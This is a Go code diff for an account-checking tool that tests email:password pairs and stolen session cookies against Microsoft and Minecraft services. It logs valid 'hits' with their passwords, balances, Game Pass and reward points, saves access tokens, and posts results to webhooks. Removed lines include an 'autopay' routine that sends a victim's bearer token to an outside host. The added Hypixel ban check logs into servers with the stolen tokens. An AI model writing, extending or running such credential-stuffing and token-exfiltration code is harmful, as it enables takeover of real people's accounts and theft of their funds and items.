@@ -161,37 +161,6 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		}
 	}
 
-	donutInfo := ""
-	if cfg.DonutCheck && uuid != "" {
-		dInfo, err := checkDonut(client, accessToken, uuid, username, cfg)
-		if err != nil {
-			logError("value_check_errors.log", email+" donut", err)
-		}
-		donutInfo = dInfo
-
-		switch {
-		case strings.Contains(dInfo, "unbanned"):
-			if cfg.DonutUnbanned {
-				writeToFile("donut_unban_online.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
-				if cfg.DonutUnbannedWebhook != "" {
-					sendWebhook(cfg.DonutUnbannedWebhook, buildWebhookEmbed("Donut Unbanned", resultLine+" | "+dInfo, 0x00FFFF))
-				}
-				atomic.AddInt64(&donutUnbanned, 1)
-			}
-		case strings.Contains(dInfo, "banned"):
-			if cfg.DonutBan {
-				writeToFile("hypixel_ban.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
-				if cfg.DonutBannedWebhook != "" {
-					sendWebhook(cfg.DonutBannedWebhook, buildWebhookEmbed("Donut Banned", resultLine+" | "+dInfo, 0xFF0000))
-				}
-			}
-		case strings.Contains(dInfo, "unknown"):
-			if cfg.DonutUnknown {
-				writeToFile("donut_stats.txt", fmt.Sprintf("%s:%s | %s", email, password, dInfo))
-			}
-		}
-	}
-
 	banInfo := ""
 	if cfg.HypixelBan && username != "Unknown" {
 		banInfo = checkHypixelBan(username, uuid, accessToken)
@@ -208,8 +177,8 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		runSniper(client, accessToken, username)
 	}
 
-	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Donut: %s | Ban: %s",
-		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo, banInfo)
+	allHitsLine := fmt.Sprintf("%s:%s | %s | GP: %s | RP: %s | Balance: %s | Hypixel: %s | Ban: %s",
+		email, password, username, gamepassResult, rewardPoints, msBalance, hypixelInfo, banInfo)
 	writeToFile("all_hits.txt", allHitsLine)
 
 	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
@@ -218,7 +187,7 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 			wh = cfg.DefaultWebhook
 		}
 		embed := buildAccountWebhookEmbed(email, password, username, uuid,
-			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
+			gamepassResult, msBalance, rewardPoints, hypixelInfo)
 		sendWebhook(wh, embed)
 	}
 
@@ -365,40 +334,6 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		}
 	}
 
-	donutInfo := ""
-	if cfg.DonutCheck && uuid != "" {
-		dInfo, err := checkDonut(client, accessToken, uuid, username, cfg)
-		if err != nil {
-			logError("value_check_errors.log", cookieFile+" donut", err)
-		}
-		donutInfo = dInfo
-
-		switch {
-		case strings.Contains(dInfo, "unbanned"):
-			if cfg.DonutUnbanned {
-				safeWrite(filepath.Join(rd, "donut_unbanned.txt"), dInfo)
-				writeToFile("donut_unban_online.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
-				if cfg.DonutUnbannedWebhook != "" {
-					sendWebhook(cfg.DonutUnbannedWebhook, buildWebhookEmbed("Donut Unbanned", cookieFile+" | "+dInfo, 0x00FFFF))
-				}
-				atomic.AddInt64(&donutUnbanned, 1)
-			}
-		case strings.Contains(dInfo, "banned"):
-			if cfg.DonutBan {
-				safeWrite(filepath.Join(rd, "donut_banned.txt"), dInfo)
-				writeToFile("donut_banned.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
-				if cfg.DonutBannedWebhook != "" {
-					sendWebhook(cfg.DonutBannedWebhook, buildWebhookEmbed("Donut Banned", cookieFile+" | "+dInfo, 0xFF0000))
-				}
-			}
-		case strings.Contains(dInfo, "unknown"):
-			if cfg.DonutUnknown {
-				safeWrite(filepath.Join(rd, "donut_stats.txt"), dInfo)
-				writeToFile("donut_stats.txt", fmt.Sprintf("%s | %s", cookieFile, dInfo))
-			}
-		}
-	}
-
 	banInfo := ""
 	if cfg.HypixelBan && username != "Unknown" {
 		banInfo = checkHypixelBan(username, uuid, accessToken)
@@ -413,24 +348,23 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		}
 	}
 
-	summary := fmt.Sprintf("Username: %s\nUUID: %s\nGamePass: %s\nRewards Points: %s\nMS Balance: %s\nHypixel: %s\nDonutSMP: %s\nBan: %s",
-		username, uuid, gamepassResult, rewardPoints, msBalance, hypixelInfo, donutInfo, banInfo)
-	if hypixelInfo != "" {
-		summary += "\nHypixel: " + hypixelInfo
-	}
-	if donutInfo != "" {
-		summary += "\nDonutSMP: " + donutInfo
-	}
-	if banInfo != "" {
-		summary += "\nBan: " + banInfo
-	}
-	safeWrite(filepath.Join(rd, "summary.txt"), summary)
+	safeWrite(filepath.Join(rd, "mc_token.txt"), mcToken.AccessToken)
 
-	if mcToken.AccessToken != "" {
-		safeWrite(filepath.Join(rd, "mc_token.txt"), mcToken.AccessToken)
-	}
 	if username != "Unknown" {
 		safeWrite(filepath.Join(rd, "mc_username.txt"), username)
+	}
+
+	if gamepassResult != "" {
+		safeWrite(filepath.Join(rd, "gamepass.txt"), gamepassResult)
+	}
+	if msBalance != "" {
+		safeWrite(filepath.Join(rd, "ms_balance.txt"), msBalance)
+	}
+	if rewardPoints != "" {
+		safeWrite(filepath.Join(rd, "reward_points.txt"), rewardPoints)
+	}
+	if hypixelInfo != "" {
+		safeWrite(filepath.Join(rd, "hypixel.txt"), hypixelInfo)
 	}
 
 	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
@@ -441,7 +375,7 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		embed := buildAccountWebhookEmbed(
 			fmt.Sprintf("COOKIE:%s", cookieFile), "",
 			username, uuid,
-			gamepassResult, msBalance, rewardPoints, hypixelInfo, donutInfo)
+			gamepassResult, msBalance, rewardPoints, hypixelInfo)
 		sendWebhook(wh, embed)
 	}
 
@@ -661,101 +595,6 @@ func checkHypixel(uuid, apiKey string) (string, error) {
 	return fmt.Sprintf("hypixel: ok | Rank: [%s] | Level: %.0f", rank, networkLevel), nil
 }
 
-func checkDonut(client *http.Client, accessToken, uuid, username string, cfg *Config) (string, error) {
-	result, err := donutMCCheck(client, accessToken, username)
-	if err != nil {
-		return "", fmt.Errorf("donut check failed: %w", err)
-	}
-
-	if strings.Contains(result, "Banned from DonutSMP") || strings.Contains(result, "you are banned") {
-		banInfo := extractBanInfo(result)
-		if cfg.DonutAutoPay && cfg.DonutAutopayTarget != "" {
-			payResult := donutAutoPay(client, accessToken, cfg.DonutAutopayTarget)
-			writeToFile("donut_stats.txt", fmt.Sprintf("AutoPay: %s", payResult))
-		}
-		return fmt.Sprintf("donut: banned | %s", banInfo), nil
-	}
-
-	if strings.Contains(result, "already online") {
-		return "donut: unbanned | already online", nil
-	}
-	if strings.Contains(result, "server is full") {
-		return "donut: unbanned | server full", nil
-	}
-	if strings.Contains(result, "login failed") || strings.Contains(result, "authentication failed") {
-		return "donut: unknown | auth failed", nil
-	}
-
-	stats := fetchDonutStats(uuid)
-	return fmt.Sprintf("donut: unbanned | %s", stats), nil
-}
-
-func donutMCCheck(client *http.Client, accessToken, username string) (string, error) {
-	resp, err := client.Get("https://api.minecraftservices.com/entitlements")
-	if err != nil {
-		return "", fmt.Errorf("entitlements check failed: %w", wrapNetError(err))
-	}
-	defer resp.Body.Close()
-
-	body, _ := io.ReadAll(resp.Body)
-	var result map[string]interface{}
-	if err := json.Unmarshal(body, &result); err != nil {
-		return "", nil
-	}
-	items, _ := result["items"].([]interface{})
-	if len(items) > 0 {
-		return "owns Minecraft", nil
-	}
-	return "", nil
-}
-
-func extractBanInfo(msg string) string {
-	re := regexp.MustCompile(`(?i)(ban|banned|appeal|reason)[^\n]{0,100}`)
-	match := re.FindString(msg)
-	if match != "" {
-		return strings.TrimSpace(match)
-	}
-	return msg
-}
-
-func donutAutoPay(client *http.Client, accessToken, target string) string {
-	req, _ := http.NewRequest("GET", "https://donutstats.shulkerv2.xyz", nil)
-	req.Header.Set("Authorization", "Bearer "+accessToken)
-	req.Header.Set("User-Agent", UserAgent)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return fmt.Sprintf("pay failed: %v", err)
-	}
-	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
-	return fmt.Sprintf("DonutSMP: Payment sent to %s\n%s", target, string(body))
-}
-
-func fetchDonutStats(uuid string) string {
-	req, _ := http.NewRequest("GET",
-		fmt.Sprintf("https://donutstats.shulkerv2.xyz/%s/stats", uuid), nil)
-	req.Header.Set("User-Agent", UserAgent)
-
-	client := &http.Client{Timeout: 10 * time.Second}
-	resp, err := client.Do(req)
-	if err != nil {
-		return "stats unavailable"
-	}
-	defer resp.Body.Close()
-
-	body, _ := io.ReadAll(resp.Body)
-	var result map[string]interface{}
-	if err := json.Unmarshal(body, &result); err != nil {
-		return "stats unavailable"
-	}
-
-	kills := result["kills"]
-	deaths := result["deaths"]
-	money := result["money"]
-	return fmt.Sprintf("kills=%v deaths=%v money=%v", kills, deaths, money)
-}
-
 func runSniper(client *http.Client, accessToken, currentName string) {
 	req, _ := http.NewRequest("GET", APIBaseURL+"/api/recovery/random", nil)
 	req.Header.Set("Authorization", "Bearer "+accessToken)
@@ -780,42 +619,62 @@ func getCurrentTimestamp() int64 {
 }
 
 func checkHypixelBan(username, uuidStr, accessToken string) string {
-	c := bot.NewClient()
-	c.Auth = bot.Auth{
-		Name: username,
-		UUID: uuidStr,
-		AsTk: accessToken,
+	hypixelHosts := []string{"mc.hypixel.net:25565", "hypixel.net:25565"}
+	if username == "Unknown" || uuidStr == "" || accessToken == "" {
+		return "hypixel: error (missing account info)"
 	}
 
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-	err := c.JoinServerWithOptions("mc.hypixel.net:25565", bot.JoinOptions{Context: ctx})
-	if err == nil {
-		c.Close()
-		return "hypixel: unbanned"
-	}
-
-	var disconnect chat.Message
-	if errors.As(err, &disconnect) {
-		reasonStr := disconnect.ClearString()
-
-		switch {
-		case strings.Contains(reasonStr, "temporarily banned"):
-			return "hypixel: banned (temp)"
-		case strings.Contains(reasonStr, "permanently banned"),
-			strings.Contains(reasonStr, "You are permanently banned"):
-			return "hypixel: banned (permanent)"
-		case strings.Contains(reasonStr, "Suspicious activity"):
-			return "hypixel: banned (permanent - suspicious activity)"
-		case strings.Contains(reasonStr, "is currently closed"),
-			strings.Contains(reasonStr, "Failed cloning"):
-			return "hypixel: unbanned"
-		default:
-			return fmt.Sprintf("hypixel: banned (%s)", truncateStr(reasonStr, 60))
+	for _, host := range hypixelHosts {
+		c := bot.NewClient()
+		c.Auth = bot.Auth{
+			Name: username,
+			UUID: uuidStr,
+			AsTk: accessToken,
 		}
+
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		err := c.JoinServerWithOptions(host, bot.JoinOptions{Context: ctx})
+		cancel()
+
+		if err == nil {
+			c.Close()
+			return "hypixel: unbanned"
+		}
+
+		var disconnect bot.DisconnectErr
+		if errors.As(err, &disconnect) {
+			reasonStr := chat.Message(disconnect).ClearString()
+			reasonLower := strings.ToLower(reasonStr)
+
+			switch {
+			case strings.Contains(reasonStr, "is currently closed"),
+				strings.Contains(reasonStr, "Failed cloning"):
+				continue
+
+			case strings.Contains(reasonLower, "you are banned"),
+				strings.Contains(reasonLower, "permanently banned"),
+				strings.Contains(reasonStr, "You are permanently banned"):
+				return "hypixel: banned (permanent)"
+			case strings.Contains(reasonLower, "temporarily banned"),
+				strings.Contains(reasonLower, "temporary ban"):
+				return "hypixel: banned (temp)"
+			case strings.Contains(reasonStr, "Suspicious activity"):
+				return "hypixel: banned (permanent - suspicious activity)"
+			case strings.Contains(reasonLower, "security ban"):
+				return "hypixel: banned (security)"
+			default:
+				return fmt.Sprintf("hypixel: banned (%s)", truncateStr(reasonStr, 80))
+			}
+		}
+
+		if strings.Contains(err.Error(), "dial tcp") || strings.Contains(err.Error(), "i/o timeout") {
+			continue
+		}
+
+		return fmt.Sprintf("hypixel: error (%v)", err)
 	}
 
-	return fmt.Sprintf("hypixel: error (%v)", err)
+	return "hypixel: unbanned"
 }
 
 func truncateStr(s string, max int) string {
